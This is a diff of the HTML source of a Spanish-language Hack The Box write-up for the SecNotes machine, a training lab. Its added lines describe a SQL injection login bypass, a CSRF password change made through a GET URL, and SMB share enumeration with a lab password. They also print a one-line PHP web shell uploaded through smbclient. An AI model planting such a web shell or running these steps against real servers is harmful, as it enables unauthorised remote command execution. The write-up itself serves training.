@@ -229,7 +229,7 @@
 
 &lt;h3 id=&quot;fase-de-explotación&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación&lt;/h3&gt;
 
-&lt;p&gt;La máquina &lt;em&gt;SecNotes&lt;/em&gt; cuenta con dos vías potenciales para realizar la intrusión, una vía &lt;a href=&quot;https://mateonitro550.github.io/SQL-Injection&quot;&gt;inyecciones SQL&lt;/a&gt; y otra vía &lt;a href=&quot;https://mateonitro550.github.io/Cross-Site-Request-Forgery-(CSRF)&quot;&gt;CSRF&lt;/a&gt; (Cross-Site Request Forgery).&lt;/p&gt;
+&lt;p&gt;La máquina &lt;em&gt;SecNotes&lt;/em&gt; cuenta con dos vías potenciales para realizar la intrusión, una vía &lt;a href=&quot;https://mateonitro550.github.io/SQL-Injection&quot;&gt;Inyecciones SQL&lt;/a&gt; y otra vía &lt;a href=&quot;https://mateonitro550.github.io/Cross-Site-Request-Forgery-(CSRF)&quot;&gt;CSRF&lt;/a&gt; (Cross-Site Request Forgery).&lt;/p&gt;
 
 &lt;h3 id=&quot;cross-site-request-forgery&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Cross-Site Request Forgery&lt;/h3&gt;
 
@@ -325,7 +325,7 @@
 
 &lt;p&gt;Para nuestra sorpresa, esto no funciona, así que tendremos que buscar otra alternativa.&lt;/p&gt;
 
-&lt;p&gt;Investigando un poco más, si decidimos cambiar nuestra contraseña, nos daremos cuenta que la página no nos solicita nuestra contraseña anterior, o algún otro método de verificación en dos pasos.&lt;/p&gt;
+&lt;p&gt;Investigando un poco más la página web, si decidimos cambiar nuestra contraseña, nos daremos cuenta que la página no nos solicita nuestra contraseña anterior, o algún otro método de verificación en dos pasos.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -333,15 +333,15 @@
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Lo que haremos será cambiar esta petición que se está tramitando por POST, a GET. De modo que no haya que proporcionar los campos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Password&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Confirm Password&lt;/code&gt; de forma manual, nosotros lo haremos a través de la propia URL.&lt;/p&gt;
+&lt;p&gt;Lo que haremos será cambiar esta petición que se está tramitando por POST, a GET. De modo que no haya que proporcionar los campos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Password&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Confirm Password&lt;/code&gt; de forma manual, los proporcionaremos a través de la propia URL.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Para ello, desde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Burp Suite&lt;/code&gt;, habiendo capturado la petición del cambio de contraseña, simplemente haremos &lt;em&gt;click derecho&lt;/em&gt;, &lt;em&gt;Change request method&lt;/em&gt;, y copiaremos la petición por GET.&lt;/p&gt;
+&lt;p&gt;Para ello, desde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Burp Suite&lt;/code&gt;, habiendo capturado la petición del cambio de contraseña, simplemente haremos &lt;em&gt;click derecho&lt;/em&gt;, &lt;em&gt;Change request method&lt;/em&gt;, y copiaremos la nueva petición por GET.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;De esta manera, si añadimos &lt;em&gt;http://10.10.10.97&lt;/em&gt; al inicio de la petición que acabamos de copiar, generaremos un URL capaz de cambiar las contraseñas a través del método GET; probémoslo.&lt;/p&gt;
+&lt;p&gt;De esta manera, si añadimos &lt;em&gt;http://10.10.10.97&lt;/em&gt; al inicio de la petición que acabamos de copiar, generaremos un URL capaz de cambiar contraseñas a través del método GET; probémoslo.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -355,19 +355,53 @@
 
 &lt;h3 id=&quot;sql-injection&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;SQL Injection&lt;/h3&gt;
 
-&lt;p&gt;Otro vector que podriamos considerar al encontrarnos frente a un panel de login sería probar &lt;a href=&quot;https://mateonitro550.github.io/SQL-Injection&quot;&gt;Inyecciones SQL&lt;/a&gt;. De este modo lo que estamos haciendo es bypassear el panel con expresiones&lt;/p&gt;
+&lt;p&gt;Otro vector a considerar al encontrarnos frente a un panel de login sería probar &lt;a href=&quot;https://mateonitro550.github.io/SQL-Injection&quot;&gt;Inyecciones SQL&lt;/a&gt; con las cuales bypassear el panel.&lt;/p&gt;
+
+&lt;p&gt;Al igual que cuando aplicamos fuerza bruta sobre el campo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Username&lt;/code&gt;, podemos ayudarnos de un diccionario como el mismo &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/sqli.auth.bypass.txt&quot;&gt;SecLists&lt;/a&gt;, el cual contiene una buena cantidad de expresiones que podemos probar.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
+&lt;p&gt;Habiendo bypasseado el panel de login llegaremos igualmente a las credenciales del recurso compartido a nivel de red, con la diferencia que tenemos acceso a las notas de todos los usuarios, no únicamente &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tyler&lt;/code&gt;.&lt;/p&gt;
+
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Independientemente de como hayamos llegado aquí … .&lt;/p&gt;
+&lt;p&gt;Independientemente de como nos hayamos hecho con las credenciales, podemos empezar a analizar el recurso con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMBMap&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.97 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'tyler'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'92g!mA8BGj0irkL%0G*&amp;amp;'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
+&lt;p&gt;Podemos observar que tenemos permiso de lectura y escritura sobre el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;new-site&lt;/code&gt;, echemos un vistazo de manera recursiva sobre este.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.97 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'tyler'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'92g!mA8BGj0irkL%0G*&amp;amp;'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'new-site'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
+&lt;p&gt;A partir de este punto empezaremos a trabajar con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt;, ya que nos resultará mucho más cómoda su interfaz de línea de comandos (CLI).&lt;/p&gt;
+
+&lt;p&gt;Para saber de que se trata el contenido dentro del recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;new-site&lt;/code&gt; podemos descargarlo en nuestra máquina con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get&lt;/code&gt;, aunque podemos también intuirlo en base al nombre de los archivos, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IIS&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;get iisstart.htm
+get iisstart.png
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Rápidamente nos daremos cuenta que estamos frente al contenido de la segunda página web, alojada en el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8808&lt;/code&gt;; por lo que, dada nuestra capacidad de escritura sobre el recurso, deberíamos de poder subir contenido que se vea reflejado en el servidor web.&lt;/p&gt;
+
+&lt;p&gt;Empecemos por subir algo simple como una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web shell&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;pre&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/pre&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;put cmd.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez subida, desde nuestro navegador, podemos acceder a ella añadiendo &lt;em&gt;/cmd.php?cmd=comando&lt;/em&gt;.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
